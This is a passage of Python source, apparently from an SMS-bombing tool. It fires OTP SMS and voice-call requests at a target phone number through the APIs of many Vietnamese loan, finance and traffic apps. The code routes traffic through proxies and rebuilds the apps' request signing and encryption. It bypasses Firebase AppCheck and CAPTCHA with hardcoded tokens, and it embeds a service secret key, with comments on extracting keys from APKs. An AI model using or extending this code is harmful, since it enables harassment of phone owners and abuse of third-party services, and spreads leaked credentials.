            print(f"[FinVuiTeck] {'✅ OK' if ok else f'❌ HTTP {r.status_code}'}")
        return ok
    except Exception as e:
        print(f"[FinVuiTeck] ERR {type(e).__name__}: {e}")
        return False


_BANANA_RSA_PUB = RSA.import_key(
    "-----BEGIN PUBLIC KEY-----\n"
    "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCf2LshP9miHsmcC4FtbGsOgwla\n"
    "MHHL3VLa8ervlaYY5/fw4yOYdsgnYqr7Wu+OfM2GWCnVFzpVjzxAuwpKPlMcMnUR\n"
    "NNhD9LwJN9eaGVX3A6OXpJjmPu3NmhSQB4Tdi7so/0Vb+WCFbsw1x6OO+Zs0+zm\n"
    "RS5WWL3JDfXYyxozA3QIDAQAB\n"
    "-----END PUBLIC KEY-----"
)


def _pkcs7_pad(data, bs=16):
    p = bs - len(data) % bs
    return data + bytes([p] * p)


def _banana_rnd_key() -> str:
    return "".join(
        random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=16)
    )

async def _banana_send(
    phone: str, url: str, loan_name: str, label: str, use_proxy: bool = True
) -> bool:
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    def _rsa_enc(k: str) -> str:
        return base64.b64encode(RSA_PKCS1.new(_BANANA_RSA_PUB).encrypt(k.encode())).decode()

    def _aes_enc(payload: dict, k: str) -> str:
        raw = json.dumps(payload, separators=(",", ":")).encode()
        ct = AES.new(k.encode(), AES.MODE_ECB).encrypt(_pkcs7_pad(raw))
        return base64.b64encode(ct).decode()

    def _hdrs(k: str) -> dict:
        return {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "language": "vi_vn", "appType": "1", "osType": "1",
            "Origin": origin, "Referer": origin + "/",
            "NEW_APP_ENC": _rsa_enc(k),
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        }

    event_url = f"{origin}/app-domain/api/burying/unauthenticated/event"
    _client_kw: dict[str, Any] = dict(follow_redirects=True, verify=False)
    if use_proxy:
        _client_kw["proxy"] = _current_proxy()
    else:
        _client_kw["proxy"] = None
    try:
        async with _make_client(**_client_kw) as client:
            try:
                k1 = _banana_rnd_key()
                await client.post(
                    event_url, headers=_hdrs(k1),
                    json={"key": _aes_enc(
                        {"eventKey": "LOGIN_SMS", "packageName": loan_name, "phone": phone}, k1
                    )},
                    timeout=8,
                )
            except Exception:
                pass
            k2 = _banana_rnd_key()
            r = await client.post(
                url, headers=_hdrs(k2),
                json={"key": _aes_enc(
                    {"smsType": "1", "phone": phone, "loanProductName": loan_name}, k2
                )},
                timeout=20,
            )
        try:
            dec = AES.new(k2.encode(), AES.MODE_ECB).decrypt(base64.b64decode(r.json()["key"]))
            dec = json.loads(dec[: -dec[-1]])
            ok = bool(dec.get("ok") or str(dec.get("code", "")) in ("0", "1", "200"))
            msg = dec.get("message") or dec.get("msg") or ""
        except Exception:
            ok = r.status_code == 200
            msg = r.text[:80]
        if ok:
            print(f"[{label}] ✅ OK")
        else:
            print(f"[{label}] ❌ {msg}")
        return ok
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
        return False


_HEDGYV_API = "https://api.hedgyv.com"
_HEDGYV_H5  = "http://h5.hedgyv.com"

# RSA public key của app com.hedgyv.loan (lấy từ APK / traffic intercept)
# Server Go dùng crypto/rsa để DECRYPT body — client phải ENCRYPT bằng key này
# Điền key vào đây sau khi extract từ APK:
#   unzip hedgyv.apk → grep -r "MII" assets/ hoặc strings lib/*.so
_HEDGYV_RSA_PUBKEY_B64 = (
    ""  # TODO: paste base64 public key (PKCS#8 hoặc PKCS#1) tại đây
)

_HEDGYV_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "language": "vi_vn",
    "appType": "1",
    "osType": "1",
    "Origin": _HEDGYV_H5,
    "Referer": _HEDGYV_H5 + "/",
    "User-Agent": "okhttp/4.9.0",
    "Accept-Encoding": "gzip",
}


def _hedgyv_rsa_encrypt(body_dict: dict) -> str:
    """
    Encrypt JSON body bằng RSA public key của hedgyv.
    Server Go dùng rsa.DecryptPKCS1v15 để decrypt field "key" trong body JSON.
    Format gửi lên: {"key": "<base64_rsa_ciphertext>"}
    Output: base64 string của RSA ciphertext (để wrap vào {"key": ...}).
    """
    raw_json = json.dumps(body_dict, separators=(",", ":"), ensure_ascii=False)
    key_der = base64.b64decode(_HEDGYV_RSA_PUBKEY_B64)
    pub_key = RSA.import_key(key_der)
    cipher = PKCS1_v1_5.new(pub_key)
    encrypted = cipher.encrypt(raw_json.encode("utf-8"))
    return base64.b64encode(encrypted).decode()


async def Call_Hedgyv(phone: str) -> bool:
    if phone.startswith("+84"):
        phone = "0" + phone[3:]
    elif phone.startswith("84") and len(phone) == 11:
        phone = "0" + phone[2:]

    if not _HEDGYV_RSA_PUBKEY_B64:
        print("[Hedgyv] SKIP — chưa có RSA public key (lấy từ APK com.hedgyv.loan)")
        return False

    try:
        sms_enc = _hedgyv_rsa_encrypt({
            "smsType": "1",
            "phone": phone,
            "loanProductName": "hedgy",
        })
        burying_enc = _hedgyv_rsa_encrypt({
            "eventKey": "LOGIN_SMS",
            "packageName": "hedgy",
            "phone": phone,
        })

        async with _make_client(follow_redirects=True, verify=False) as client:
            try:
                await client.post(
                    f"{_HEDGYV_API}/burying/unauthenticated/event",
                    headers=_HEDGYV_HEADERS,
                    json={"key": burying_enc},
                    timeout=8,
                )
            except Exception:
                pass

            r = await client.post(
                f"{_HEDGYV_API}/user/sentSms",
                headers=_HEDGYV_HEADERS,
                json={"key": sms_enc},
                timeout=20,
            )

        print(f"[Hedgyv] {phone} → {r.status_code} | {r.text[:120]}")
        if r.status_code == 200:
            try:
                d = r.json()
                return str(d.get("code", "")) in ("0", "1", "200") or d.get("ok")
            except Exception:
                return True
        return False

    except Exception as e:
        print(f"[Hedgyv] ERR {type(e).__name__}: {e}")
        return False


async def sentSms1(phone):
    return await _banana_send(
        phone, "http://www.moneymua.top/app-domain/api/user/sentSms", "Money_Mua", "moneymua",
        use_proxy=False,
    )


async def sentSms_FvBanana(phone):
    return await _banana_send(
        phone, "https://www.fvbanana.top/app-domain/api/user/sentSms", "Fast_Vay", "fvbanana"
    )


# ── Tien24h ──
_T24H_BASE = "https://api.tien-24h.com"
_T24H_L = hashlib.md5(b"tien24hh5").hexdigest()
_T24H_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "platform": "h5", "app-version": "1.0.0", "lang": "vi_VN",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Origin": "https://h5.tien-24h.com", "Referer": "https://h5.tien-24h.com/",
    "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
    "Accept-Language": "vi-VN,vi;q=0.9", "Accept-Encoding": "gzip, deflate, br",
}

# ── Tien24h Pro ──
_T24HPRO_BASE = "https://api.tien-24h.com"
_T24HPRO_L = hashlib.md5(b"tien24hpro").hexdigest()
_T24HPRO_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "platform": "h5", "app-version": "1.0.0", "lang": "vi_VN",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Origin": "https://www.tien24hpro.com", "Referer": "https://www.tien24hpro.com/",
    "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
    "Accept-Language": "vi-VN,vi;q=0.9", "Accept-Encoding": "gzip, deflate, br",
}


def _t24h_yr(obj):
    if isinstance(obj, dict):
        return {k: _t24h_yr(obj[k]) for k in sorted(obj.keys())}
    return obj


async def Call_ConCac27(phone):
    appcheck_tok = _load_appcheck_token("tien24h")
    if not appcheck_tok:
        return False
    body = {"appCode": "tien24hh5", "version": "1.0.0", "mobileType": "1", "phone": phone}
    try:
        async with _make_client(timeout=30, proxy=_current_proxy()) as client:
            rs = await client.get(
                f"{_T24H_BASE}/api/user/app/common/secret",
                headers=_T24H_HEADERS,
                params={"appCode": "tien24hh5", "version": "1.0.0", "mobileType": "1"},
            )
            secret = ""
            if rs.status_code == 200:
                secret = (rs.json().get("data") or {}).get("verifySignSecret", "")
            jsessionid = rs.cookies.get("JSESSIONID", "")
            if not jsessionid:
                import re as _re
                m = _re.search(r"JSESSIONID=([^;]+)", rs.headers.get("set-cookie", ""))
                if m:
                    jsessionid = m.group(1)
            ts = int(time.time() * 1000)
            sorted_body = json.dumps(_t24h_yr(body), separators=(",", ":"))
            sign = hashlib.md5(f"{_T24H_L}*|*{secret}*|*{sorted_body}*|*{ts}".encode()).hexdigest()
            r = await client.post(
                f"{_T24H_BASE}/api/user/app/login/sms",
                headers={
                    **_T24H_HEADERS,
                    "X-Firebase-AppCheck": appcheck_tok,
                    "sign": sign,
                    "timestamp": str(ts),
                    "Cookie": f"JSESSIONID={jsessionid}",
                },
                json=body,
            )
            try:
                d = r.json()
                return d.get("code") == 200 or d.get("data") is True
            except Exception:
                return r.status_code == 200
    except Exception as e:
        print(f"[Tien24h] ERR {type(e).__name__}: {e}")
        return False


async def Call_Tien24hPro(phone):
    appcheck_tok = _load_appcheck_token("tien24hpro")
    if not appcheck_tok:
        return False
    body = {"appCode": "tien24hpro", "version": "1.0.0", "mobileType": "1", "phone": phone}
    try:
        async with _make_client(timeout=30, proxy=_current_proxy()) as client:
            rs = await client.get(
                f"{_T24HPRO_BASE}/api/user/app/common/secret",
                headers=_T24HPRO_HEADERS,
                params={"appCode": "tien24hpro", "version": "1.0.0", "mobileType": "1"},
            )
            secret = ""
            if rs.status_code == 200:
                secret = (rs.json().get("data") or {}).get("verifySignSecret", "")
            jsessionid = rs.cookies.get("JSESSIONID", "")
            if not jsessionid:
                import re as _re
                m = _re.search(r"JSESSIONID=([^;]+)", rs.headers.get("set-cookie", ""))
                if m:
                    jsessionid = m.group(1)
            ts = int(time.time() * 1000)
            sorted_body = json.dumps(_t24h_yr(body), separators=(",", ":"))
            sign = hashlib.md5(f"{_T24HPRO_L}*|*{secret}*|*{sorted_body}*|*{ts}".encode()).hexdigest()
            r = await client.post(
                f"{_T24HPRO_BASE}/api/user/app/login/sms",
                headers={
                    **_T24HPRO_HEADERS,
                    "X-Firebase-AppCheck": appcheck_tok,
                    "sign": sign,
                    "timestamp": str(ts),
                    "Cookie": f"JSESSIONID={jsessionid}",
                },
                json=body,
            )
            try:
                d = r.json()
                return d.get("code") == 200 or d.get("data") is True
            except Exception:
                return r.status_code == 200
    except Exception as e:
        print(f"[Tien24hPro] ERR {type(e).__name__}: {e}")
        return False


async def Call_GhiNhanh(phone):
    BASE = "https://api.ghinhanh.com"
    appcheck_tok = _load_appcheck_token("ghinhanh")
    h1 = {
        "Content-Type": "application/json", "lang": "vi_VN",
        "Accept": "*/*", "User-Agent": "IOS",
        "Accept-Language": "vi_VN", "platform": "h5", "app-version": "1.0.2",
    }

    def _ghinhanh_yr(obj):
        if obj is None:
            return obj
        if isinstance(obj, list):
            return [_ghinhanh_yr(x) for x in obj]
        if isinstance(obj, dict):
            return {k: _ghinhanh_yr(obj[k]) for k in sorted(obj.keys())}
        return obj

    try:
        async with _make_client(timeout=15, verify=False, proxy=_current_proxy()) as client:
            rs = await client.get(
                f"{BASE}/api/user/app/common/secret",
                params={"appCode": "ghinhanh", "mobileType": "2", "version": "1.0.2"},
                headers=h1,
            )
            d1 = rs.json() if rs.status_code == 200 else {}
            secret = (d1.get("data") or {}).get("verifySignSecret", "")
            jsessionid = rs.cookies.get("JSESSIONID", "")
            if not jsessionid:
                import re as _re
                m = _re.search(r"JSESSIONID=([^;]+)", rs.headers.get("set-cookie", ""))
                if m:
                    jsessionid = m.group(1)
            if not secret:
                return False
            body = {"appCode": "ghinhanh", "mobileType": "2", "phone": phone, "version": "1.0.2"}
            app_md5 = hashlib.md5(b"ghinhanh").hexdigest()
            ts = int(time.time() * 1000)
            body_sorted = json.dumps(_ghinhanh_yr(body), separators=(",", ":"))
            sign = hashlib.md5(f"{app_md5}*|*{secret}*|*{body_sorted}*|*{ts}".encode()).hexdigest().lower()
            post_headers = {**h1, "timestamp": str(ts), "sign": sign, "Cookie": f"JSESSIONID={jsessionid}"}
            if appcheck_tok:
                post_headers["X-Firebase-AppCheck"] = appcheck_tok
            r2 = await client.post(
                f"{BASE}/api/user/app/login/sms", headers=post_headers, json=body,
            )
        return r2.status_code == 200
    except Exception as e:
        print(f"[GhiNhanh] ERR {type(e).__name__}: {e}")
        return False


async def Call_TuiTien(phone):
    try:
        ts = str(int(time.time() * 1000))
        sign_raw = hashlib.md5(f"{phone}{ts}".encode()).hexdigest()
        headers = {
            "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "vi_VN", "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "IOS", "lang": "vi_VN",
            "timestamp": ts, "sign": sign_raw, "Connection": "keep-alive",
        }
        body = {
            "appCode": "tuitien", "phone": phone, "version": "1.0.1",
            "phoneMark": str(uuid.uuid4()).upper(), "mobileType": 1, "smsType": 1,
        }
        async with _make_client(verify=False, timeout=20, proxy=_current_proxy()) as client:
            r = await client.post(
                "https://api.tui-tien.com/api/user/app/login/sms",
                headers=headers, json=body,
            )
        try:
            d = r.json()
            ok = d.get("code") in (0, 200, "0", "200") or d.get("success") is True
        except Exception:
            ok = r.status_code == 200
        print(f"[TuiTien] {r.status_code} | {r.text[:120]}")
        return ok
    except Exception as e:
        print(f"[TuiTien] ERR {type(e).__name__}: {e}")
        return False


# ── Izion24 (Firebase AppCheck + x-secret-key) ──
_IZION24_API        = "https://api.izion24.com.vn"
_IZION24_SECRET_KEY = "vKqflXfgd9KGuj2UYnkwVhX4C2s2yn"

_IZION24_FIXED_APPCHECK = (
    "eyJraWQiOiJrMnhhbUEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9."
    "eyJzdWIiOiIxOjc2NTA5OTM0MTUyNDppb3M6YWQwZjA2YjAxZDczZTIzYjI3MmQ0MSIsImF1ZCI6WyJwcm9qZWN0cy83NjUwOTkzNDE1MjQiLCJwcm9qZWN0cy9pemlvbjI0Il0sInByb3ZpZGVyIjoiZGV2aWNlX2NoZWNrX2FwcF9hdHRlc3QiLCJpc3MiOiJodHRwczovL2ZpcmViYXNlYXBwY2hlY2suZ29vZ2xlYXBpcy5jb20vNzY1MDk5MzQxNTI0IiwiZXhwIjoxNzgzOTQxMTQ3LCJpYXQiOjE3ODM5Mzc1NDcsImp0aSI6InFUUkhsbEF1Ul9PX3o2VTBsaF9VazFpRHVsQmdJaFR5bmJjT3Q2d2k2MVkifQ."
    "VqU4AdgSJA_u9eyrccezWh8ZkuG1uAeGx2DsoFI3JUuWXTkWOtjmUWWyZ90ffwsrIud5TmQaXJWaorvZ34s5NQSGuba7uhj7EBzxvJW5aI6YtzDg2EfeysElU9A0c-cYVqCiublwXNHjRwO5zWTEIl-cT7LlmMqelQRiVGcFJ1Se_pWXYiodtO3w9NM_PQvoa6fMr0muuGMTfERL1mpaoQ1Nkkcw1dBXskNZpgCMljtOnXHNuib8-fvKpWMKw8E802rCt2weC1ewrO-lxCjm9ZO4v19KhzZLq5b19SNUEUpJpgrYW_TaniYN2GK8gYzmT2TaqfXLtEWadObJ4xQD6y0FeyF65g9Alm_uYvPgcX_cS4KsOies6c_9JWRdJvcz-ieH0Iv2dRX1pJu50q8EgPMDXGuk8--qvupaIo2iWNnz_3EknzDuXvknitW7Yx1YrKWVp8Bh5O_4SUfwJ2VBHKUhiD9kEH_K79VaiSlvpaNb5qFxk8AABNIL8r8gMxH6"
)


def _izion24_headers(device_id: str, ua_suffix: str) -> dict:
    return {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Connection": "keep-alive",
        "x-secret-key": _IZION24_SECRET_KEY,
        "User-Agent": f"Izion24/ios-1.0.199.206-{device_id}-iPhone13,3-{ua_suffix}",
    }


def _izion24_token_valid(tok: str) -> bool:
    try:
        import base64 as _b64, json as _j
        parts = tok.split('.')
        pad = parts[1] + '=' * (4 - len(parts[1]) % 4)
        data = _j.loads(_b64.b64decode(pad))
        return data.get('exp', 0) > time.time()
    except Exception:
        return False


async def _izion24_send(phone: str, voice_provider: str, is_resend: bool, ua_suffix: str, label: str) -> bool:
    appcheck_tok = _IZION24_FIXED_APPCHECK
    if not _izion24_token_valid(appcheck_tok):
        print(f"[{label}] SKIP — AppCheck token đã hết hạn, cần lấy token mới từ thiết bị iOS (intercept x-firebase-appcheck)")
        return False
    device_id = str(uuid.uuid4()).upper()
    phone_fmt = phone if phone.startswith("+84") else ("+84" + phone.lstrip("0"))
    headers = _izion24_headers(device_id, ua_suffix)
    headers["x-firebase-appcheck"] = appcheck_tok
    body = {
        "mobileNumber": phone_fmt,
        "voiceProvider": voice_provider,
        "isOtpResend": is_resend,
        "language": "vi",
        "deviceId": device_id,
        "isConsentChecked": True,
    }
    try:
        async with _make_client(timeout=20, proxy=_current_proxy()) as client:
            r = await client.post(
                f"{_IZION24_API}/auth/generate-otp",
                headers=headers,
                json=body,
            )
        print(f"[{label}] {r.status_code} | {r.text[:120]}")
        return r.status_code == 200
    except Exception as e:
        print(f"[{label}] ERR {type(e).__name__}: {e}")
        return False


async def Call_Izion24_SMS(phone):
    return await _izion24_send(phone, "sms", False, "LogIn", "Izion24-SMS")


async def Call_Izion24_Voice(phone):
    return await _izion24_send(phone, "smartbot", True, "LogInOTP", "Izion24-Voice")


_GT365_CAPTCHA_REGISTER = (
    "0cAFcWeA5V0KKBR1dhsWQqK2M6YSWs9FjusR55_7wn9quvFPGuNvvLPNfZ2tFm8syPqwNhlhN7IwOmRYVVgaubs3SAsoHnCzVS79G7YKk"
    "L8e394Nda1yQohnRzt7SC7CN_C5MO5xUKcYNB9J9wnX4jA9l2BJeApy3NzAZA5ygsUeAKaj6lr3Gii7NtZEn814yoWTLOxCnPzTsmvWIDa"
    "_OhRkZbQqqxGPUVIk574DDxPBd2biM-LvbczoVLMuIh97Vd8ac3Cy5PQ95hPfkx7Fd2CxG_lVK9ipnwli3cJuO10w9_-zZlRv5Ikc-08f"
    "RsnJ1qRHU1hDRqz2ll284qOiGFOWqP8XDeRXEvkzf3MD9_udwGmTDhPQnX6_rWE7L03q1XGJf_K0ILdxuG0gBJS_R1Tpfxvr9B4UmkI_Y"
    "OJZHY2JWW2jbbXQ_2TqJ5ZKjbhEu0QJcr7Pgm4jTR8YlUv-D6PjsiAJd8CTmEzy0FG0xzTx-f1a1K5MPsRcxbTbGu24WTvrcX6lq4WsXY"
    "dGotfi_amW4x4UbiGObjrxl_iltc5Gaoo5vBzevalidkxC2m0sIVSWV3JkaQTFgnmWZD550eMGOE9gHwPj744cl4evNU0kWEl-OMDXrd8GW"
    "dz_h_bQuSgIYJCjvsquZSL0b3org-QekrfpoRWMcWbDUlpR05rOZjnLZLN1t3VN_qn44-hQJI9oHZCh3-f4sxvKSSFLXgjQd-i55b-2NOi"
    "pWaysGpATOuWNTuHJk6GPe88tXtJc05UcfDhe2MgBaz-IzWsuX0SwIpSsAKUAG8yiAFH9W1xj64mvEHIS1V1GKcXXoOMYYHT0HUVC8Rat5"
    "PBAwI5wu4NdGK3WSiy9DTeJ0UuQVCZt4RHP5XwmSXva1gkGEun-VQqNE4QrY6TQtBcL3PZO8I6znN6JVc00fquT85FAbXCE1XhHYjgO6e"
    "sWAMbHQXDRxBLA7IT_t7xfk3jn7yxVSfTIdEw0EMnQzl-xLJItcaUTErFKgql338xkvdwchWZT7dqz2vhQB1J9Isy5dCvagOocPgh0wHY"
    "K6QHXI7_36N1pnMN4T-O5AAOY4VMxONh8DPKVAWOUuavwP498De1DqX8pPRcAqAyGP5JTslaHPvOZ6M3ZAM8rVdakW90mowyrFiMulnjn"
    "Jb_qovVYS7ogdcmqhUPXZWFeMOfOXI6GPAL71W3p5A9YOGBqdVBI27pxTE0PbTfqC9wIJ8iDXV2y0AsRFI7wGXf1a73BlpBEWx158Y8Gy"
    "d9-itgb3A25pNHIy7Xc4pf2EpnPjiQKy4Ti30BjML4MWNhEExMlLOyOuFiAIlchaBZVEim7GFOhB65ZIgzOS-MU5FNJGYEU9NDA6YbJ6M"
    "8W8RrthHo440s4oJP7P_DxD6CbnGJwARlF9d8lSXeRvvRUI6e_8GK2M_PlMNEEgsJ-fKc3jPdpeY5CpU9p-BDJWv-EPKoHjPkiEiqZKkH"
    "4r6P5764Ry5cd1uLB2Wshrso_xBqUr0A33c9mIF7sGR7o2dLrXvBRKgiVImWaCtKSHEGLV8_fmeyjXqjNbtquscLYqQMo5oeez7St56kUK"
    "9Mxl27zMPiMBqtr6QXakuuHFehHqW0e1RJaseIktPESIKq6fKP8ATUYT2X2ZXv5IFdnj-wSljPEMNQlaabwrkEs99UjopZXOajzl-kMZgn"
    "CxgcoHQs6CcKhlW3L9lQYDMg0UtswFq1m1a0ED5KI6HJfb0nFN3HAcuQFo1SZGtwVZXbbxoAzde_36CMis2rDz99My0vnX4ozdcNN0vk13"
    "2rfKG5_uc0L_AbaeXIbe-Fc6x9hSl4gvMDqGjzC8jbQt-NbG6nQpqZeJtkzdcVHPSzgebuE5jtTFAfXr92n9jTMwMZEsGnP-UruYExC7t"
    "uKwUBzOK01LjjTNgR3SMO3OjfginYJhSSnoplGG2b8rUhuJRXQC7x6K9lnxuILGZtj0EOTUTRHdiJmR_CXaj5U-fvZbB7zWJvn3N8fWBQ"
    "dJhZqz0_xNCLDg_ZDVFoUBYugnHdHZ-Kb9jbh5iNliIm9X6VoGAquBYaflmGvp3Da-auS1Izr4pRsmop5TvO-L0SgyBUUhXp9q5g8K7_y"
    "s-WcechwMe8q2sqqGzKOqD7NJ6VayVS6h0c253_yOe7lFNHKkNGx1NtKU-Rl1UppRaHctQabDLXVhopmoiczePW-i82nc51EDLQE2XNm9O"
    "ZE4ebAc1FVSd46Reocj-TeyWw0kQoUd8c_BQaDZpTDDCTKvxwqA9HHXWTx8X1n0_Mrboqs2rtyFNS_tUfdxfn1h9FiyKCnh-m5HSSErYo"
    "onqsEYEh2E3TTg-u2h6rOnda0098oLo_0d8zJGCtWW9nolKWY17ihDYp4-45gTW3k8-UIGxbN0WanZmxUmeb509D-bqRJbNwbmTa7Yd4GX"
    "q5uIVyUjOFj6CeA2soktM78gfnZKy_2F0bCF1ZLHK9zcZDJwar0C2t0LywmVgIm5YudMXcbQ3GUiT9qycrenPxo8UZBuHFhR3cHdFLRdY"
    "0h6ADlzYmQ9iaHmVBawuhRA"
)

_GT365_CAPTCHA_FORGOT = (
    "0cAFcWeA6PyOWMfahX_TCH8DNAitRIiEEElFjBSAg-SFDD6eyztRm9q0nvtL-2eJTXXsXPSX-hlUBVvs_qNgnzBFJiS8ujc4L3KkhnhHNQ"
    "bFSel-X9ktIgHpiRS7JVwtB6wW5uVaYRrXVxmFGwox9tbCtVVoyIVgRKjGtpZaWcmPF1hgRYcGx31PrO_JsHeLHqzBo8MactK3UjflxAy"
    "PhCtkVCMwoJyx5DGv3w9hjzLa8NV1OIrD7ux2vPFcZ8vhcL-sKqkY9gmgF5rKsyJZxXC939B4ezVfYpInEkV64SI7eJHhxmQ0HpoBuGu5"
    "a9M1R8UAvjj38Y09weIn_TPyZ-RgDE80CUKDvazvskLP4kfJ-knHyQNsuspLf2umu-Xoohz2IhSMC9EUTeBTv_lgWqCEbGgpxplGUpKMNm"
    "7vCEtQw744CDgVubJ4Cmq9ACWFDFO4lIihCTxmMzwIBc4xTxIPdu1I32KAN74yXZ14gAFyvea_kA0b7gWNh3VvGlhg3ZVpMbNzQqeplnTI"
    "lrt5CVa6m0wj4hG4xINfPKDRFeBYIipyHFk-I1Oq4ckAbt_Mr1WjmW2aaurTPR020LwKjyD2J_ZR45YOwX1Q7H7H9eAmRdyq8pucDWu0P"
    "ianMpcHPVAfcXcxJJiF0YtBZ3WXfSp4Yr9S7PLhiXNasAS_NDj4lGQ0XXKxzq5K3sJyQr9SGyodwRGnBw63f4uYvz0GhNvB4-hFAcNDvi"
    "jV5O0QpMxfmhdyzw9nzD4RfkLtgoXukANAwX5cFjoCSyZV10-TcFOcimavQyz4YXD47MiagDqnpcUSpSWvqv4RUbJVm4H_AFTtU46IcoaN"
    "3hUqNiyotHk5ZbM_PsMIUWCiUkiPrnz1QLKMQ1QvJXjQHEOBU4Lylc3RQqMbRMG8KLpsaEjBbzVroYticfhW-41jQzgMsJbmfs7MUj7VR"
    "G2WL3k7YoT-fR1ttvhuDCKO2UNCaLcKZNI9UJSDQqndaniLeSReiREIToL0BckvOay3vV8JdeZ7wklQuwPDGxAtbZ6fZwz8zCud8yh0bL6"
    "n_5AdWmoWHN-ye5CnSfFAU3QJ7CjwxEtJ91H_cg--N4EoF-PXdsIKOhJHAgjgiT_rwId8YGQJ22pSwSwB_zkGEqeZI2TBuyTf8aQY4euO"
    "jY-E1QpP4JQ82Mra7X4ClUYmAd_7n7KYXq3SUPvhScROoGtYAWeJiFwlxL8z5OfQlqtMgqsjgJK8N14SCNPaTJ9Ihep2sP1rQ0CPxVdqW"
    "px-9Gtgq1WgApzZfuhjJp3U6EmOtAnqloptAkEhGAV_2gzVkA4eIXil5uBr_l7VEZTnUBVDoAeUo0IpXnARsgD7RuL86s1ZCEJvaE3kI1"
    "vYzIG-atF9iRzmYoFQd7jk4jZ7NZ-qDvEliSbm2cjwUPQpKTQcY_P5BV6krGQlDVl9wGq0w56KdZV8HH2Q4-EzwotdrjEMUmVJdzCcVDR"
    "1DxSSUJPgJD8m0OcDdkv3gum3PFkyj0AsPt7WLMZEHZy2J2krkvWa2-w8mj1bgoTwZ4_KbmcHMS-LcwjvSjv0044zo_aistTH1tsT5ygp"
    "N5iKf7_4fhk9-RXmUVyFWkqJLamDjFBW7QENDkuoJ_B4ePuz2ZSyOIf_9iLeLtiWXiSOZ8JpfAm5JC0SfA_hVh3TjqdbJw5VsnXTSXq0"
    "wDgYBr0oJhAjc_9zag-71RWkyfEERdiDyaYhtX623dATTW6U1aQ0N2jvDWf0GavJS7sshWxrZU1FWWZGxCd2ZOvxbG7uC53_f1sATk4fR"
    "XHSD2gHVAdp6ZEn7-oIJMvsRt7GOWMNJEPSeU3EARM2MCmIo4GAhOuEyE1UKO6UKVjwmZnSPOCUd1icnzViPo1ShfLlPg7r1IBRT9bcwQ"
    "1cfGFl-giNKCbK1jiId0_yD8KMfPIp2EyiQGTBcuf7qmmv3kM7_bR31uWG-0dA1-gZRuApjWDbjjqDLJ1KcX5BMpxeNho8t1fhFPPemS2"
    "_AdJSF06pLkYSnLG4ck2zw57XuLTIvREB3OtUBEovyNlSkPhwlFcc3oJwZcWwK4KlirSYJ-wYwZksiKYuErvpuEYqmfv1MZkkWNJBIN1s"
    "33ePAH_-LxTnFhLWiGhLQkr1l2BWABNIWRmUZeTU__WDshl_EeAWglfJQ0p_nVl8SuSmOn6UOmhZaHWhCGSh9Lnlx7gYlG2zHEREzJqUm"
    "08UbQr8ffE3Gd-bl45dvUpq0TKxjxXA1-D0NYqOsjZ9b-vzmBTd-J7eq3oA58m9aCHXmKzuls_A9tWL49qKY6Yjf_O-sImItPUQ1Jo_J0"
    "5EQr4IOpWDjqoGVRpjK5U2fXS0xDi46WZzpJ8_gQX5rcLawJNlB-_Hr7MZYvZTVM1hBpIh7LNvvCL63b9YX2gf0goL9ao1yZyP4QOoBwH"
    "deNxIBFFRG7rrU0gwnOFMY0cryq-vHmYuvaCMS0j5vLKRcoMoLQzqD24EWJ1XKD_gDGaIjnL3dJJbemWLytx3wALBwHBuubBhJSvseJr7"
    "a4HHGTUwnwlDNOFWmnpukL7_uM8FvcEv3AekB-iQZj_RrqU5QiQVjUdgc0GGs88Hl-DYG9IIqrooK6hVYtHIFG4K_7JiMX0EnvijNn94H"
    "sd_0N1rgwCl6CMUBwPCjUXDLCrOQkzjoNuSAeOEQMj4fUS4KwNtlf4vfPbjgEadnCVu8adXxZ16pDIHK8WA1MOym2pEq8zEZwX3rhMX6y"
    "hnObyzctSxzRccUjFF6J9S2Qk9AqX_iPZsbmMWFXYm9JPN8eYiWRmw"
)


def _gt365_headers(device_id):
    return {
        'Accept': 'application/json,text/plain,text/html',
        'X-Client-Model': 'iPhone 12 Pro',
        'X-Client-Version': '18.1',
        'X-Client-OS': 'iOS',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Content-Type': 'application/json',
        'User-Agent': 'Trafic365/1 CFNetwork/1568.200.51 Darwin/24.1.0',
        'X-Device-Id': device_id,
        'X-App-Version': '2.0.3',
    }


async def giaothong365_register(phone):
    phone_fmt = phone if phone.startswith('0') else '0' + phone.lstrip('0')
    device_id = str(uuid.uuid4()).upper()
    captcha = _load_gt365_captcha() or _GT365_CAPTCHA_REGISTER
    try:
        async with _make_client(timeout=15, follow_redirects=True, verify=False) as client:
            await client.get(
                'https://api-v2.giaothong365.vn/app/config/api/v1.0/p/all?platform=ios',
                headers=_gt365_headers(device_id),
            )
            resp = await client.put(
                'https://api-v2.giaothong365.vn/openid/api/v1.0/account/p/register/request-otp',
                headers=_gt365_headers(device_id),
                json={'phoneNumber': phone_fmt, 'captchaToken': captcha},
            )
            data = resp.json().get('data', {})
